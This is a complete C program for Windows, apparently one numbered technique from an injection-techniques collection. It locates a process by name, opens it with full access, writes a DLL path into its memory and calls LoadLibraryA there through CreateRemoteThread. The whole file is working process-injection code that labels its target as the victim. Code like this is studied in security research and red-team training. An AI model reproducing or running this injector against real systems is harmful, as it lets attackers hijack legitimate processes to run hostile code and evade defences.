#include <Windows.h>
#include<string.h>
#include <wchar.h>
#include <TlHelp32.h>

HANDLE FindProcess(wchar_t* processName) 
{
	HANDLE hProcessSnapshot;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnapshot == INVALID_HANDLE_VALUE)
	{
		wprintf(L"\n[--] Could not create process list snapshot.");
		return INVALID_HANDLE_VALUE;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnapshot, &pe32))
	{
		wprintf(L"\n[--] Could not read the process information: %ld", GetLastError());
		CloseHandle(hProcessSnapshot);
		return INVALID_HANDLE_VALUE;
	}

	do
	{
		if (!wcscmp(pe32.szExeFile, processName))
		{
			wprintf(L"\n[+] Found process %s.", pe32.szExeFile);

			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL)
			{
				return hProcess;
			}
			else
			{
				wprintf(L"\n[--] Failed to open process %s.", pe32.szExeFile);
				return INVALID_HANDLE_VALUE;
			}
		}
	} while (Process32Next(hProcessSnapshot, &pe32));

	wprintf(L"\n[--] %s could not be found.", processName);
	return INVALID_HANDLE_VALUE;
}

BOOL LoadRemoteDLL(HANDLE hProcess, const char* dllPath)
{
	LPVOID remoteDllPathAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remoteDllPathAddress == NULL)
	{
		wprintf(L"[--] Memory allocation failed: VirtualAllocEx unsuccessful.");
		return FALSE;
	}

	BOOL remoteWriteSuccess = WriteProcessMemory(hProcess, remoteDllPathAddress, dllPath, strlen(dllPath), NULL);
	if (!remoteWriteSuccess)
	{
		wprintf(L"[--] Memory write failed: WriteProcessMemory unsuccessful.");
		return FALSE;
	}

	LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (loadLibraryAddress == NULL)
	{
		wprintf(L"[--] Address retrieval failed: GetProcessAddress unsuccessful.");
		return FALSE;
	}

	HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPathAddress, NULL, NULL);
	if (remoteThread == NULL) 
	{
		wprintf(L"[--] Remote thread creation failed: CreateRemoteThread unsuccessful.");
		return FALSE;
	}

	CloseHandle(hProcess);

	return TRUE;
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc != 3)
	{
		wprintf(L"\nMissing arguments...");
		wprintf(L"Usage:\n Technique-1.exe [Process Name] [Dll Name / Full Path]");
		wprintf(L"\n\n");
		return 1;
	}
	
	char dllPath[MAX_PATH];
	size_t i;
	wcstombs_s(&i, dllPath, MAX_PATH, argv[2], MAX_PATH);
	
	wprintf(L"\nTarget / Victim process name: %s\n", argv[1]);
	wprintf(L"\nDLL to inject: %s\n", argv[2]);

	HANDLE hProcess = FindProcess(argv[1]);
	if (hProcess != INVALID_HANDLE_VALUE)
	{
		BOOL injectionSuccess = LoadRemoteDLL(hProcess, dllPath);
		if (injectionSuccess)
		{
			wprintf(L"\n[+] DLL injection successful!");
		}
		else
		{
			wprintf(L"\n[+] DLL injection failed.");
			CloseHandle(hProcess);
		}
	}

	wprintf(L"\n\n");
	return 0;
}